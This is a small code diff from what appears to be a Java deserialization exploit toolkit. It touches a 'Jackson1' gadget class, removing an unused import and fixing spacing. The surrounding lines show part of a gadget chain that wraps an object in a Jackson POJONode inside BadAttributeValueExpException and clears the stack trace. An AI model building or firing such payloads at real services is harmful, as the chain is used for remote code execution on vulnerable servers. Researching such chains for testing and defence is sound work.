@@ -2,7 +2,6 @@ package com.qi4l.JYso.gadgets;
 
 import com.fasterxml.jackson.databind.node.POJONode;
 import com.qi4l.JYso.gadgets.utils.Gadgets;
-import com.qi4l.JYso.gadgets.utils.Reflections;
 import javassist.ClassPool;
 import javassist.CtClass;
 import javassist.CtMethod;
@@ -31,7 +30,7 @@ public class Jackson1 implements ObjectPayload<Object> {
 
         POJONode node = new POJONode(tempImpl);
 
-        BadAttributeValueExpException val  = new BadAttributeValueExpException(null);
+        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
         setFieldValue(val, "val", node);
         //清除堆栈信息
         setFieldValue(val, "stackTrace", new StackTraceElement[0]);
